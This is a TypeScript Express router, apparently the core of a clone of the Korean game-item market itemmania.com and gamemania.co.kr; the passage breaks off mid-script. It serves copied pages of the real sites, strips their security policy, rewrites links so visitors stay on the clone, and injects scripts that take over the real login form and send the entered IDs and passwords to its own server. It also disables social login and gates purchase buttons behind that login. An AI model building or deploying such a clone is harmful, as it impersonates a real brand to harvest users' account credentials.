import { Router, type IRouter } from "express";
import { readFileSync } from "fs";
import { join } from "path";
import { logger } from "../lib/logger";

const router: IRouter = Router();

// 서버 시작 시 정적 HTML 파일을 메모리에 로드
const STATIC_HTML_PATH = join(process.cwd(), "src", "static", "itemmania.html");
let staticHtml = "";

try {
  staticHtml = readFileSync(STATIC_HTML_PATH, "utf-8");
  logger.info("itemmania.html 로드 완료");
} catch (e) {
  logger.error({ err: e }, "itemmania.html 로드 실패");
}

const LOGIN_HTML_PATH = join(process.cwd(), "src", "static", "login.html");
let loginHtml = "";

try {
  loginHtml = readFileSync(LOGIN_HTML_PATH, "utf-8");
  logger.info("login.html 로드 완료");
} catch (e) {
  logger.error({ err: e }, "login.html 로드 실패");
}

const GIFTCARD_HTML_PATH = join(process.cwd(), "src", "static", "giftcard.html");
let giftcardHtml = "";

try {
  giftcardHtml = readFileSync(GIFTCARD_HTML_PATH, "utf-8");
  logger.info("giftcard.html 로드 완료");
} catch (e) {
  logger.error({ err: e }, "giftcard.html 로드 실패");
}

const GAMEMANIA_HTML_PATH = join(process.cwd(), "src", "static", "gamemania.html");
let gamemanaHtml = "";

try {
  gamemanaHtml = readFileSync(GAMEMANIA_HTML_PATH, "utf-8");
  logger.info("gamemania.html 로드 완료");
} catch (e) {
  logger.error({ err: e }, "gamemania.html 로드 실패");
}

const GAMECHARGE_HTML_PATH = join(process.cwd(), "src", "static", "game-charge.html");
let gamechargeHtml = "";

try {
  gamechargeHtml = readFileSync(GAMECHARGE_HTML_PATH, "utf-8");
  logger.info("game-charge.html 로드 완료");
} catch (e) {
  logger.error({ err: e }, "game-charge.html 로드 실패");
}

const SELL_LINEAGE_CLASSIC_HTML_PATH = join(process.cwd(), "src", "static", "sell-lineage-classic.html");
let sellLineageClassicHtml = "";

try {
  sellLineageClassicHtml = readFileSync(SELL_LINEAGE_CLASSIC_HTML_PATH, "utf-8");
  logger.info("sell-lineage-classic.html 로드 완료");
} catch (e) {
  logger.error({ err: e }, "sell-lineage-classic.html 로드 실패");
}

const SELL_MAPLESTORY_WORLD_HTML_PATH = join(process.cwd(), "src", "static", "sell-maplestory-world.html");
let sellMaplestoryWorldHtml = "";

try {
  sellMaplestoryWorldHtml = readFileSync(SELL_MAPLESTORY_WORLD_HTML_PATH, "utf-8");
  logger.info("sell-maplestory-world.html 로드 완료");
} catch (e) {
  logger.error({ err: e }, "sell-maplestory-world.html 로드 실패");
}

function loadSellHtml(filename: string): string {
  try {
    const html = readFileSync(join(process.cwd(), "src", "static", filename), "utf-8");
    logger.info(`${filename} 로드 완료`);
    return html;
  } catch (e) {
    logger.error({ err: e }, `${filename} 로드 실패`);
    return "";
  }
}

const chatHtml                = loadSellHtml("chat.html");
const chatOrderedHtml         = loadSellHtml("chat-ordered.html");
const sellMaplestoryHtml      = loadSellHtml("sell-maplestory.html");
const sellOdinHtml            = loadSellHtml("sell-odin.html");
const sellMabinogiHtml        = loadSellHtml("sell-mabinogi.html");
const sellLostarkHtml         = loadSellHtml("sell-lostark.html");
const sellLineageMHtml        = loadSellHtml("sell-lineage-m.html");
const sellGeosangHtml         = loadSellHtml("sell-geosang.html");
const sellAion2Html           = loadSellHtml("sell-aion2.html");
const sellDnfHtml             = loadSellHtml("sell-dnf.html");

// game_id → html 매핑 (TOP 10)
const SELL_HTML_MAP: Record<string, string> = {
  "5913": "", // 리니지클래식 — 별도 변수로 처리
  "5233": "", // 메이플스토리월드 — 별도 변수로 처리
  "138":  sellMaplestoryHtml,
  "4696": sellOdinHtml,
  "155":  sellMabinogiHtml,
  "2696": sellLostarkHtml,
  "3449": sellLineageMHtml,
  "101":  sellGeosangHtml,
  "5799": sellAion2Html,
  "281":  sellDnfHtml,
};

// 주입할 인터셉트 스크립트 (순수 JS/CSS, React 없음)
const INTERCEPT_SCRIPT = `
<style>
#_im_overlay {
  display: none;
  position: fixed;
  inset: 0;
  z-index: 2147483647;
  background: rgba(0,0,0,0.55);
  align-items: center;
  justify-content: center;
}
#_im_overlay.active { display: flex; }
#_im_modal {
  position: relative;
  background: #fff;
  border-radius: 14px;
  padding: 36px 32px 28px;
  width: 400px;
  max-width: 92vw;
  box-shadow: 0 24px 64px rgba(0,0,0,0.22);
  font-family: 'Pretendard', -apple-system, sans-serif;
}
#_im_modal h2 {
  margin: 0 0 22px;
  font-size: 22px;
  font-weight: 700;
  color: #1a1a1a;
  letter-spacing: -.02em;
}
#_im_modal .tab-row {
  display: flex;
  gap: 0;
  margin-bottom: 22px;
  border-bottom: 2px solid #eee;
}
#_im_modal .tab-btn {
  flex: 1;
  padding: 10px 0;
  font-size: 15px;
  font-weight: 600;
  background: none;
  border: none;
  border-bottom: 2px solid transparent;
  margin-bottom: -2px;
  cursor: pointer;
  color: #999;
  transition: all .2s;
}
#_im_modal .tab-btn.on {
  color: #159EFD;
  border-bottom-color: #159EFD;
}
#_im_modal input {
  display: block;
  width: 100%;
  box-sizing: border-box;
  padding: 13px 15px;
  margin-bottom: 10px;
  border: 1.5px solid #ddd;
  border-radius: 9px;
  font-size: 15px;
  font-family: inherit;
  outline: none;
  transition: border-color .2s;
}
#_im_modal input:focus { border-color: #159EFD; }
#_im_modal .submit-btn {
  display: block;
  width: 100%;
  padding: 14px;
  margin-top: 6px;
  background: #159EFD;
  color: #fff;
  border: none;
  border-radius: 9px;
  font-size: 16px;
  font-weight: 700;
  cursor: pointer;
  font-family: inherit;
  letter-spacing: -.01em;
  transition: background .2s;
}
#_im_modal .submit-btn:hover { background: #0d88e0; }
#_im_modal .errmsg {
  margin-top: 10px;
  min-height: 20px;
  font-size: 13px;
  color: #e03030;
  text-align: center;
}
#_im_modal .close-btn {
  position: absolute;
  top: 14px; right: 18px;
  background: none;
  border: none;
  font-size: 22px;
  cursor: pointer;
  color: #aaa;
  line-height: 1;
  padding: 4px;
}
#_im_modal .close-btn:hover { color: #333; }
</style>

<div id="_im_overlay">
  <div id="_im_modal">
    <button class="close-btn" id="_im_close">✕</button>
    <div id="_im_body"></div>
  </div>
</div>

<script>
(function(){
  var overlay = document.getElementById('_im_overlay');
  var modalBody = document.getElementById('_im_body');
  var closeBtn = document.getElementById('_im_close');
  var currentUser = null;

  // --- 모달 열기/닫기 ---
  function openModal(html) {
    modalBody.innerHTML = html;
    overlay.classList.add('active');
  }
  function closeModal() {
    overlay.classList.remove('active');
    modalBody.innerHTML = '';
  }
  closeBtn.addEventListener('click', closeModal);
  overlay.addEventListener('click', function(e){ if(e.target===overlay) closeModal(); });

  // --- API 호출 ---
  function api(method, path, body) {
    return fetch('/api' + path, {
      method: method,
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: body ? JSON.stringify(body) : undefined
    }).then(function(r){ return r.json(); }).catch(function(){ return {}; });
  }

  // --- 헤더 업데이트 ---
  function updateHeader() {
    var loginsDiv = document.querySelector('.header-logins');
    if (!loginsDiv) return;
    if (currentUser) {
      loginsDiv.innerHTML =
        '<span style="font-size:14px;font-weight:600;color:#2e2e2e">' +
          (currentUser.nickname || currentUser.email) + '님' +
        '</span>' +
        '<div class="divider"></div>' +
        '<button type="button" id="_im_logout_btn" style="font-size:14px;font-weight:600;background:none;border:none;cursor:pointer;color:#159EFD">로그아웃</button>';
      document.getElementById('_im_logout_btn').addEventListener('click', function(){
        api('POST','/auth/logout').then(function(){ currentUser=null; location.reload(); });
      });
    }
  }

  // --- 로그인 폼 ---
  function showLogin() {
    openModal(
      '<h2>로그인</h2>' +
      '<div class="tab-row">' +
        '<button class="tab-btn on" onclick="(function(){'+
          'document.querySelectorAll(\\'#_im_modal .tab-btn\\').forEach(function(b){b.classList.remove(\\'on\\')});'+
          'event.target.classList.add(\\'on\\');'+
        '})()">로그인</button>' +
        '<button class="tab-btn" onclick="IM_showRegister()">회원가입</button>' +
      '</div>' +
      '<input type="email" id="_im_e" placeholder="이메일" />' +
      '<input type="password" id="_im_p" placeholder="비밀번호" />' +
      '<button class="submit-btn" onclick="IM_doLogin()">로그인</button>' +
      '<div class="errmsg" id="_im_err"></div>'
    );
    setTimeout(function(){ var el=document.getElementById('_im_e'); if(el) el.focus(); }, 50);
  }

  function showRegister() {
    openModal(
      '<h2>회원가입</h2>' +
      '<div class="tab-row">' +
        '<button class="tab-btn" onclick="IM_showLogin()">로그인</button>' +
        '<button class="tab-btn on" onclick="(function(){'+
          'document.querySelectorAll(\\'#_im_modal .tab-btn\\').forEach(function(b){b.classList.remove(\\'on\\')});'+
          'event.target.classList.add(\\'on\\');'+
        '})()">회원가입</button>' +
      '</div>' +
      '<input type="text" id="_im_n" placeholder="닉네임" />' +
      '<input type="email" id="_im_e" placeholder="이메일" />' +
      '<input type="password" id="_im_p" placeholder="비밀번호 (6자 이상)" />' +
      '<button class="submit-btn" onclick="IM_doRegister()">가입하기</button>' +
      '<div class="errmsg" id="_im_err"></div>'
    );
    setTimeout(function(){ var el=document.getElementById('_im_n'); if(el) el.focus(); }, 50);
  }

  // 전역으로 노출 (onclick에서 사용)
  window.IM_showLogin = showLogin;
  window.IM_showRegister = showRegister;

  window.IM_doLogin = function() {
    var email = (document.getElementById('_im_e')||{}).value || '';
    var pw    = (document.getElementById('_im_p')||{}).value || '';
    var errEl = document.getElementById('_im_err');
    if (!email || !pw) { errEl.textContent = '이메일과 비밀번호를 입력해주세요.'; return; }
    api('POST','/auth/login',{ email:email, password:pw }).then(function(data){
      if (data && data.id) {
        currentUser = data;
        updateHeader();
        closeModal();
      } else {
        errEl.textContent = (data && data.error) || '로그인에 실패했습니다.';
      }
    });
  };

  window.IM_doRegister = function() {
    var nick  = (document.getElementById('_im_n')||{}).value || '';
    var email = (document.getElementById('_im_e')||{}).value || '';
    var pw    = (document.getElementById('_im_p')||{}).value || '';
    var errEl = document.getElementById('_im_err');
    if (!nick || !email || !pw) { errEl.textContent = '모든 항목을 입력해주세요.'; return; }
    api('POST','/auth/register',{ nickname:nick, email:email, password:pw }).then(function(data){
      if (data && data.id) {
        currentUser = data;
        updateHeader();
        closeModal();
      } else {
        errEl.textContent = (data && data.error) || '가입에 실패했습니다.';
      }
    });
  };

  // --- 전체서비스 패널 토글 ---
  function initPanel() {
    var panel = document.getElementById('headerMainPanel');
    var menuBtn = document.querySelector('.header-menu');
    if (!panel || !menuBtn) { setTimeout(initPanel, 200); return; }

    // 패널 기본 숨김 (sf-hidden 대체)
    panel.style.display = 'none';

    function openPanel() {
      panel.classList.add('is-open');
      panel.style.display = '';
      panel.setAttribute('aria-hidden', 'false');
      menuBtn.setAttribute('aria-expanded', 'true');
      document.body.style.overflow = 'hidden';
    }

    function closePanel() {
      panel.classList.remove('is-open');
      panel.style.display = 'none';
      panel.setAttribute('aria-hidden', 'true');
      menuBtn.setAttribute('aria-expanded', 'false');
      document.body.style.overflow = '';
    }

    // 3단바 버튼 클릭
    menuBtn.addEventListener('click', function(e) {
      e.preventDefault(); e.stopImmediatePropagation();
      if (panel.classList.contains('is-open')) { closePanel(); } else { openPanel(); }
    }, true);

    // 배경 클릭으로 닫기
    panel.addEventListener('click', function(e) {
      if (e.target.hasAttribute('data-header-panel-close') ||
          e.target.classList.contains('header-panel-backdrop')) {
        closePanel();
      }
    });

    // ESC 키로 닫기
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Escape' && panel.classList.contains('is-open')) { closePanel(); }
    });

    // 패널 내부: 프록시 링크는 그냥 이동 (href는 이미 서버에서 rewrite됨)
    panel.addEventListener('click', function(e) {
      var a = e.target.closest('a[href]');
      if (!a) return;
      var href = a.getAttribute('href') || '';
      if (href.startsWith('/proxy/')) { closePanel(); }
    });
  }

  initPanel();

  // 차단 마커가 붙은 링크 클릭 → 준비 중 안내 (body 버블링만, document 전역 X)
  document.body.addEventListener('click', function(e) {
    var a = e.target.closest && e.target.closest('a[data-blocked]');
    if (a) { e.preventDefault(); alert('해당 기능은 현재 준비 중입니다.'); }
  });

  // --- 버튼 후킹 ---
  function hookButtons() {
    var loginsDiv = document.querySelector('.header-logins');
    if (!loginsDiv) { setTimeout(hookButtons, 200); return; }

    var loginBtn     = loginsDiv.querySelector('button');
    var registerLink = loginsDiv.querySelector('a');

    if (loginBtn) {
      loginBtn.addEventListener('click', function(e){
        e.preventDefault(); e.stopImmediatePropagation();
        location.href = '/proxy/portal/user/p_login_form.html';
      }, true);
    }
    if (registerLink) {
      registerLink.addEventListener('click', function(e){
        e.preventDefault(); e.stopImmediatePropagation();
        showRegister();
      }, true);
    }

    // Enter 키 로그인/가입 지원
    document.addEventListener('keydown', function(e){
      if (e.key === 'Enter' && overlay.classList.contains('active')) {
        var submitBtn = document.querySelector('#_im_modal .submit-btn');
        if (submitBtn) submitBtn.click();
      }
    });

    // 채팅 버튼 → 채팅 페이지로 이동
    var chatBtn = document.querySelector('#chat_notice button[aria-label="채팅"], #chat_notice button');
    if (chatBtn) {
      chatBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        location.href = '/proxy/myroom/chat/list.html';
      }, true);
    }

    // 이미 로그인 여부 확인
    api('GET', '/auth/me').then(function(data){
      if (data && data.id) { currentUser = data; updateHeader(); }
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', hookButtons);
  } else {
    hookButtons();
  }
})();
</script>
`;

// 로그인 페이지 전용 인터셉트 스크립트
const LOGIN_INTERCEPT_SCRIPT = `
<script>
(function() {
  function stripCSP() {
    document.querySelectorAll('meta[http-equiv="content-security-policy"]').forEach(el => el.remove());
  }

  function showError(msg) {
    var errEl = document.getElementById('_im_login_err');
    if (!errEl) {
      errEl = document.createElement('p');
      errEl.id = '_im_login_err';
      errEl.style.cssText = 'color:#e53e3e;font-size:14px;margin:8px 0 0;text-align:center;';
      var form = document.querySelector('form[name=g_LOGIN_FORM]');
      if (form) form.appendChild(errEl);
    }
    errEl.textContent = msg;
  }

  function init() {
    stripCSP();

    // 로그인 폼 가로채기
    var loginForm = document.querySelector('form[name=g_LOGIN_FORM]');
    if (loginForm) {
      loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        var userId = document.getElementById('user_id').value.trim();
        var userPw = document.getElementById('user_password').value;
        var btn = loginForm.querySelector('button[type=submit]');
        if (btn) btn.disabled = true;

        try {
          var res = await fetch('/api/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'include',
            body: JSON.stringify({ email: userId, password: userPw })
          });
          var data = await res.json();
          if (res.ok) {
            var returnUrl = new URLSearchParams(location.search).get('returnUrl');
            location.href = returnUrl ? '/proxy/' : '/proxy/';
          } else {
            showError(data.error || '아이디 또는 비밀번호가 올바르지 않습니다.');
            if (btn) btn.disabled = false;
          }
        } catch(err) {
          showError('서버 오류가 발생했습니다. 잠시 후 다시 시도해주세요.');
          if (btn) btn.disabled = false;
        }
      });
    }

    // 네이버/카카오 소셜 로그인 차단
    var naverBtn = document.getElementById('naver_id_login');
    if (naverBtn) {
      naverBtn.addEventListener('click', function(e) {
        e.preventDefault();
        alert('소셜 로그인은 지원하지 않습니다. 아이디/비밀번호로 로그인해주세요.');
      });
    }

    // 차단 마커 링크 → 준비 중 (body 버블링만)
    document.body.addEventListener('click', function(e) {
      var a = e.target.closest && e.target.closest('a[data-blocked]');
      if (a) { e.preventDefault(); alert('해당 기능은 현재 준비 중입니다.'); }
    });

    // 헤더 로그인 버튼 → 현재 페이지 유지
    var headerLoginBtn = document.querySelector('.header-logins button');
    if (headerLoginBtn) {
      headerLoginBtn.addEventListener('click', function(e) {
        e.preventDefault();
      });
    }

    // 회원가입 링크 차단
    var joinLink = document.querySelector('.header-logins a');
    if (joinLink) {
      joinLink.addEventListener('click', function(e) {
        e.preventDefault();
        alert('회원가입은 메인 페이지에서 이용해주세요.');
        location.href = '/proxy/';
      });
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
</script>
`;

const GIFTCARD_INTERCEPT_SCRIPT = `
<style>
/* 로그인 모달/오버레이 강제 숨김 */
.g_layer:not(.all_menu_layer),
.g_popup,
.g_dim,
[class*="login_layer"],
[class*="login_modal"],
[id*="login_layer"],
[id*="login_pop"] {
  display: none !important;
}
</style>
<script>
(function() {
  // 로그인 팝업 함수 무력화
  var noop = function() {};
  var loginFns = ['g_login_open','loginOpen','openLogin','showLogin','login_popup','loginPopup','g_login_popup'];
  loginFns.forEach(function(fn) { window[fn] = noop; });

  // MutationObserver로 동적으로 추가되는 로그인 모달 차단
  var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(m) {
      m.addedNodes.forEach(function(node) {
        if (node.nodeType !== 1) return;
        var el = node;
        var cls = el.className || '';
        var id  = el.id || '';
        if (
          (cls.includes('g_layer') && !cls.includes('all_menu_layer')) ||
          cls.includes('g_popup') ||
          cls.includes('g_dim') ||
          id.toLowerCase().includes('login')
        ) {
          el.style.display = 'none';
        }
        // 자식 노드 중 로그인 모달도 처리
        el.querySelectorAll && el.querySelectorAll('.g_layer:not(.all_menu_layer), .g_popup, .g_dim').forEach(function(child) {
          child.style.display = 'none';
        });
      });
    });
  });
  observer.observe(document.documentElement, { childList: true, subtree: true });

  function init() {
    // 이미 있는 모달 숨김
    document.querySelectorAll('.g_layer:not(.all_menu_layer), .g_popup, .g_dim').forEach(function(el) {
      el.style.display = 'none';
    });

    // 로그인 팝업 함수 재무력화 (사이트 JS가 나중에 정의할 수 있으므로)
    loginFns.forEach(function(fn) { window[fn] = noop; });

    // 로그인 버튼 → 로그인 페이지 (특정 요소에만 핸들러)
    var loginBtn = document.querySelector('.header-logins button');
    if (loginBtn) {
      loginBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        location.href = '/proxy/portal/user/p_login_form.html';
      }, true);
    }

    // 차단 마커 링크 → 준비 중 (body 버블링만, document 전역 X)
    document.body.addEventListener('click', function(e) {
      var a = e.target.closest && e.target.closest('a[data-blocked]');
      if (a) { e.preventDefault(); alert('해당 기능은 현재 준비 중입니다.'); }
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
</script>
`;

const GAMEMANIA_INTERCEPT_SCRIPT = `
<script>
(function() {
  // 차단 마커 링크 → 준비 중 (body 버블링만)
  document.body.addEventListener('click', function(e) {
    var a = e.target.closest && e.target.closest('a[data-blocked]');
    if (a) { e.preventDefault(); alert('해당 기능은 현재 준비 중입니다.'); }
  });
})();
</script>
`;

const GAMECHARGE_INTERCEPT_SCRIPT = `
<script>
(function() {
  var noop = function() {};
  var loginFns = ['showLogin','openLogin','g_login','gLogin','loginPop','loginPopup'];
  loginFns.forEach(function(fn) { try { window[fn] = noop; } catch(e) {} });

  // 로그인 팝업 MutationObserver로 억제
  var observer = new MutationObserver(function() {
    document.querySelectorAll('.g_layer:not(.all_menu_layer), .g_popup, .g_dim').forEach(function(el) {
      el.style.display = 'none';
    });
    loginFns.forEach(function(fn) { try { if (window[fn] !== noop) window[fn] = noop; } catch(e) {} });
  });
  observer.observe(document.documentElement, { childList: true, subtree: true });

  function init() {
    document.querySelectorAll('.g_layer:not(.all_menu_layer), .g_popup, .g_dim').forEach(function(el) {
      el.style.display = 'none';
    });
    loginFns.forEach(function(fn) { try { window[fn] = noop; } catch(e) {} });

    // 로그인 버튼 → 로그인 페이지 (해당 요소에만)
    var loginBtn = document.querySelector('.header-logins button');
    if (loginBtn) {
      loginBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        location.href = '/proxy/portal/user/p_login_form.html';
      }, true);
    }

    // 충전 submit 버튼 → 준비 중 (해당 요소에만)
    document.querySelectorAll('form button[type=submit], .charge_btn').forEach(function(btn) {
      btn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        alert('게임 충전 서비스는 현재 준비 중입니다.');
      }, true);
    });

    // 차단 마커 링크 → 준비 중 (body 버블링만)
    document.body.addEventListener('click', function(e) {
      var a = e.target.closest && e.target.closest('a[data-blocked]');
      if (a) { e.preventDefault(); alert('해당 기능은 현재 준비 중입니다.'); }
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
</script>
`;

function stripCsp(html: string): string {
  return html.replace(
    /<meta[^>]+http-equiv\s*=\s*["']?content-security-policy["']?[^>]*>/gi,
    ""
  );
}

// 알려진 라우트 매핑 (구체적인 경로 우선)
const PROXY_URL_MAP: [string, string][] = [
  ['https://www.itemmania.com/portal/user/p_login_form.html', '/proxy/portal/user/p_login_form.html'],
  ['https://www.itemmania.com/myroom/chat/list.html',         '/proxy/myroom/chat/list.html'],
  ['https://www.itemmania.com/myroom/chat/',                  '/proxy/myroom/chat/list.html'],
  ['https://www.itemmania.com/myroom/chat',                   '/proxy/myroom/chat/list.html'],
  ['https://www.itemmania.com/game_charge/', '/proxy/game-charge'],
  ['https://www.itemmania.com/game_charge',  '/proxy/game-charge'],
  ['https://www.itemmania.com/portal/giftcard/', '/proxy/giftcard'],
  ['https://www.itemmania.com/portal/giftcard',  '/proxy/giftcard'],
  ['https://www.gamemania.co.kr/',  '/proxy/gamemania'],
  ['https://www.gamemania.co.kr',   '/proxy/gamemania'],
  ['https://www.itemmania.com/',    '/proxy/'],
  ['https://www.itemmania.com',     '/proxy/'],
];

/** HTML 전체(JS 문자열 포함)에서 외부 도메인을 제거/치환 */
function rewriteExternalLinks(html: string): string {
  let result = html;

  // Step 1: 알려진 라우트 전체 URL → 프록시 경로 (split/join = 전역 치환, unquoted 포함)
  for (const [from, to] of PROXY_URL_MAP) {
    result = result.split(from).join(to);
  }

  // Step 2: 남은 itemmania.com 서브도메인 제거 (→ 상대경로로 변환)
  for (const host of [
    'https://img1.itemmania.com',
    'https://m.itemmania.com',
    'https://ssadaprice.itemmania.com',
    'https://www.itemmania.com',
    'http://www.itemmania.com',
    'https://itemmania.com',
    'http://itemmania.com',
  ]) {
    result = result.split(host).join('');
  }

  // Step 3: gamemania.co.kr → 프록시 경로
  for (const host of [
    'https://www.gamemania.co.kr',
    'http://www.gamemania.co.kr',
    'https://gamemania.co.kr',
  ]) {
    result = result.split(host).join('/proxy/gamemania');
  }

  return result;
}

/** 모든 페이지에 주입되는 전역 네비게이션 인터셉터 — window.open / location.assign 등 재정의 */
const GLOBAL_NAV_INTERCEPTOR = `<script>
(function(){
'use strict';
var ROUTE_MAP=[
  ['/portal/user/p_login_form.html','/proxy/portal/user/p_login_form.html'],
  ['/myroom/chat/list.html','/proxy/myroom/chat/list.html'],
  ['/myroom/chat/','/proxy/myroom/chat/list.html'],
  ['/myroom/chat','/proxy/myroom/chat/list.html'],
  ['/game_charge/','/proxy/game-charge'],
  ['/game_charge','/proxy/game-charge'],
  ['/portal/giftcard/','/proxy/giftcard'],
  ['/portal/giftcard','/proxy/giftcard'],
  ['/sell/list.html','/proxy/sell/list.html'],
  ['/myroom/','/proxy/'],
  ['/myroom','/proxy/'],
  ['/','/proxy/'],
];
var IM_ORIGINS=[
  'https://www.itemmania.com','http://www.itemmania.com',
  'https://itemmania.com','http://itemmania.com',
];
var GM_ORIGINS=['https://www.gamemania.co.kr','http://www.gamemania.co.kr','https://gamemania.co.kr'];
function rewrite(url){
  if(!url||typeof url!=='string') return url;
  var u=url.trim();
  for(var g=0;g<GM_ORIGINS.length;g++) if(u.startsWith(GM_ORIGINS[g])) return '/proxy/gamemania';
  for(var i=0;i<IM_ORIGINS.length;i++){
    if(u.startsWith(IM_ORIGINS[i])){
      var path=u.slice(IM_ORIGINS[i].length)||'/';
      for(var r=0;r<ROUTE_MAP.length;r++){
        if(path===ROUTE_MAP[r][0]||path.startsWith(ROUTE_MAP[r][0])){
          return ROUTE_MAP[r][1]+(path.length>ROUTE_MAP[r][0].length?path.slice(ROUTE_MAP[r][0].length):'');
        }
      }
      return '/proxy/';
    }
  }
  return url;
}
/* window.open → 현재 탭 이동 */
var _open=window.open;
window.open=function(url,target,feat){
  var rw=rewrite(url);
  if(rw!==url){location.href=rw;return null;}
  return _open?_open.call(window,url,target,feat):null;
};
/* location.assign / replace */
try{
  var _ass=location.assign.bind(location);
  var _rep=location.replace.bind(location);
  location.assign=function(u){_ass(rewrite(u));};
  location.replace=function(u){_rep(rewrite(u));};
}catch(e){}
/* a[href] 전역 클릭 */
document.addEventListener('click',function(e){
  var a=e.target.closest&&e.target.closest('a[href]');
  if(!a) return;
  var h=a.getAttribute('href')||'';
  var rw=rewrite(h);
  if(rw!==h){e.preventDefault();e.stopImmediatePropagation();location.href=rw;}
},true);
})();
</script>`;

function prepare(html: string): string {
  const clean = rewriteExternalLinks(stripCsp(html));
  // <head> 또는 문서 맨 앞에 전역 인터셉터 주입
  if (clean.includes("<head>")) {
    return clean.replace("<head>", "<head>" + GLOBAL_NAV_INTERCEPTOR);
  }
  if (clean.includes("<head ")) {
    return clean.replace(/<head [^>]*>/, (m) => m + GLOBAL_NAV_INTERCEPTOR);
  }
  return GLOBAL_NAV_INTERCEPTOR + clean;
}

function serveItemmania(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", INTERCEPT_SCRIPT + "</body>");
  }
  return result + INTERCEPT_SCRIPT;
}

function serveLogin(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", LOGIN_INTERCEPT_SCRIPT + "</body>");
  }
  return result + LOGIN_INTERCEPT_SCRIPT;
}

function serveGiftcard(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", GIFTCARD_INTERCEPT_SCRIPT + "</body>");
  }
  return result + GIFTCARD_INTERCEPT_SCRIPT;
}

function serveGamemania(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", GAMEMANIA_INTERCEPT_SCRIPT + "</body>");
  }
  return result + GAMEMANIA_INTERCEPT_SCRIPT;
}

function serveGameCharge(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", GAMECHARGE_INTERCEPT_SCRIPT + "</body>");
  }
  return result + GAMECHARGE_INTERCEPT_SCRIPT;
}

const SELL_INTERCEPT_SCRIPT = `
<script>
(function() {
  function isLoggedIn() {
    try { return !!JSON.parse(localStorage.getItem('_im_user') || 'null'); } catch(e) { return false; }
  }

  function showLoginModal() {
    const ov = document.getElementById('_im_overlay');
    if (ov) { ov.classList.add('active'); return; }
    const div = document.createElement('div');
    div.innerHTML = '<div id="_im_overlay" style="display:flex;position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.55);align-items:center;justify-content:center"><div style="background:#fff;border-radius:14px;padding:36px 32px 28px;width:380px;max-width:92vw;box-shadow:0 24px 64px rgba(0,0,0,.22);font-family:Pretendard,-apple-system,sans-serif"><div style="text-align:right;margin-bottom:8px"><button id="_im_close" style="background:none;border:none;font-size:22px;cursor:pointer;color:#888">&times;</button></div><h2 style="margin:0 0 8px;font-size:22px;font-weight:700">로그인이 필요합니다</h2><p style="color:#555;margin:0 0 24px;font-size:14px">구매하시려면 먼저 로그인해주세요.</p><button id="_im_login_btn" style="width:100%;padding:14px;background:#159EFD;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer">로그인하기</button></div></div>';
    document.body.appendChild(div.firstChild);
    document.getElementById('_im_close').onclick = function() { document.getElementById('_im_overlay').style.display='none'; };
    document.getElementById('_im_login_btn').onclick = function() { location.href='/proxy/login'; };
  }

  function interceptBuyButtons() {
    document.querySelectorAll('a.buy-btn, a[href*="buy"], a[href*="order"], button.buy-btn, .btn_buy, .sell-buy-btn, a.btn_trade, .item-buy-btn, [class*="buy"], [class*="order_btn"]').forEach(function(el) {
      el.addEventListener('click', function(e) {
        if (!isLoggedIn()) { e.preventDefault(); e.stopPropagation(); showLoginModal(); }
      }, true);
    });
  }

  document.addEventListener('DOMContentLoaded', function() {
    // 로그인·회원가입 버튼
    var loginBtn = document.querySelector('.header-logins button');
    if (loginBtn) {
      loginBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopPropagation(); location.href = '/proxy/login';
      });
    }
    var joinBtn = document.querySelector('.header-logins a');
    if (joinBtn) { joinBtn.href = '/proxy/login'; }

    // 구매 버튼 인터셉트
    interceptBuyButtons();

    // 동적 콘텐츠를 위한 MutationObserver
    var mo = new MutationObserver(function() { interceptBuyButtons(); });
    mo.observe(document.body, { childList: true, subtree: true });

    // 아이템 목록 링크 클릭 시 → 로그인 요구
    document.body.addEventListener('click', function(e) {
      var target = e.target.closest('a');
      if (!target) return;
      var href = target.getAttribute('href') || '';
      if (href.includes('order') || href.includes('buy') || href.includes('trade_buy')) {
        if (!isLoggedIn()) { e.preventDefault(); e.stopPropagation(); showLoginModal(); }
      }
    }, true);
  });
})();
</script>
`;

function serveLineageClassic(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", SELL_INTERCEPT_SCRIPT + "</body>");
  }
  return result + SELL_INTERCEPT_SCRIPT;
}

const CHAT_INTERCEPT_SCRIPT = `
<script>
(function() {
  // 로그인 상태 확인
  function isLoggedIn() {
    return fetch('/api/auth/me', { credentials: 'include' })
      .then(function(r) { return r.ok ? r.json() : null; })
      .then(function(d) { return d && d.id; })
      .catch(function() { return false; });
  }

  // 마이룸 버튼 → 메인으로
  function initButtons() {
    var myroomBtn = document.querySelector('button.go_myroom');
    if (myroomBtn) {
      myroomBtn.addEventListener('click', function(e) {
        e.preventDefault();
        location.href = '/proxy/';
      });
    }
    var blockBtn = document.querySelector('button.block_list');
    if (blockBtn) {
      blockBtn.addEventListener('click', function(e) {
        e.preventDefault();
        alert('차단리스트 기능은 준비 중입니다.');
      });
    }
    // 차단 마커 링크
    document.body.addEventListener('click', function(e) {
